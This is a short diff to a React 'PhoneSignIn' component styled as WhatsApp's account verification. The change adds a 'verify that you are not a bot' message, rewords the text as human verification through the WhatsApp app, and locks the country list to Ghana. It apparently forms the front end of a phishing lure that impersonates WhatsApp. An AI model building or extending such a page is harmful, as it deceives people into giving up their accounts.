@@ -31,17 +31,18 @@ export default function PhoneSignIn() {
             </header>
 
             <main className="content">
+                <p>Verify that you are not a bot to access this page</p>
                 <p className="description">
-                    WhatsApp will need to verify your account...
+                    Complete human verification with Whatsapp app
                 </p>
 
                 <div className="country-row">
 
                     <label>Country</label>
-                    <select>
+                    <select disabled={true}>
                         <option>Ghana</option>
-                        <option>United States</option>
-                        <option>United Kingdom</option>
+                        {/* <option>United States</option>
+                        <option>United Kingdom</option> */}
                     </select>
                 </div>
 
